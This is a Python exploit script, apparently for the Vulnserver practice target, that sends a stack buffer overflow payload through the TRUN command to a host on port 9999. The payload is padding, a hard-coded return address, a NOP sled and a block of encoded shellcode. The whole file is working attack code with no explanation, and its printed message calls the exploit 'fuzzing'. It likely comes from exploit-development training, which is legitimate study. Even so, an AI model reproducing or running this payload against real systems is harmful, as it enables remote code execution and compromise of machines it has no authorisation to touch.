#!/usr/bin/python
import socket
import sys

bof = ("\xb8\x7d\xf4\xb9\x7a\xdd\xc3\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x52\x31\x45\x12\x83\xed\xfc\x03\x38\xfa\x5b\x8f\x3e\xea\x1e"
"\x70\xbe\xeb\x7e\xf8\x5b\xda\xbe\x9e\x28\x4d\x0f\xd4\x7c\x62"
"\xe4\xb8\x94\xf1\x88\x14\x9b\xb2\x27\x43\x92\x43\x1b\xb7\xb5"
"\xc7\x66\xe4\x15\xf9\xa8\xf9\x54\x3e\xd4\xf0\x04\x97\x92\xa7"
"\xb8\x9c\xef\x7b\x33\xee\xfe\xfb\xa0\xa7\x01\x2d\x77\xb3\x5b"
"\xed\x76\x10\xd0\xa4\x60\x75\xdd\x7f\x1b\x4d\xa9\x81\xcd\x9f"
"\x52\x2d\x30\x10\xa1\x2f\x75\x97\x5a\x5a\x8f\xeb\xe7\x5d\x54"
"\x91\x33\xeb\x4e\x31\xb7\x4b\xaa\xc3\x14\x0d\x39\xcf\xd1\x59"
"\x65\xcc\xe4\x8e\x1e\xe8\x6d\x31\xf0\x78\x35\x16\xd4\x21\xed"
"\x37\x4d\x8c\x40\x47\x8d\x6f\x3c\xed\xc6\x82\x29\x9c\x85\xca"
"\x9e\xad\x35\x0b\x89\xa6\x46\x39\x16\x1d\xc0\x71\xdf\xbb\x17"
"\x75\xca\x7c\x87\x88\xf5\x7c\x8e\x4e\xa1\x2c\xb8\x67\xca\xa6"
"\x38\x87\x1f\x68\x68\x27\xf0\xc9\xd8\x87\xa0\xa1\x32\x08\x9e"
"\xd2\x3d\xc2\xb7\x79\xc4\x85\x77\xd5\xed\x1c\x10\x24\xf1\x9a"
"\x32\xa1\x17\xc8\xa2\xe4\x80\x65\x5a\xad\x5a\x17\xa3\x7b\x27"
"\x17\x2f\x88\xd8\xd6\xd8\xe5\xca\x8f\x28\xb0\xb0\x06\x36\x6e"
"\xdc\xc5\xa5\xf5\x1c\x83\xd5\xa1\x4b\xc4\x28\xb8\x19\xf8\x13"
"\x12\x3f\x01\xc5\x5d\xfb\xde\x36\x63\x02\x92\x03\x47\x14\x6a"
"\x8b\xc3\x40\x22\xda\x9d\x3e\x84\xb4\x6f\xe8\x5e\x6a\x26\x7c"
"\x26\x40\xf9\xfa\x27\x8d\x8f\xe2\x96\x78\xd6\x1d\x16\xed\xde"
"\x66\x4a\x8d\x21\xbd\xce\xad\xc3\x17\x3b\x46\x5a\xf2\x86\x0b"
"\x5d\x29\xc4\x35\xde\xdb\xb5\xc1\xfe\xae\xb0\x8e\xb8\x43\xc9"
"\x9f\x2c\x63\x7e\x9f\x64")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" +  "\x90" * 32 + bof 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('192.168.43.112',9999))
	s.send(('TRUN /.:/'+shellcode))
	print("Fuzzing with TRUN comamnd with %s bytes"% str(len(shellcode)))
	s.close()
except:
	print("Error connecting to server")
        sys.exit()

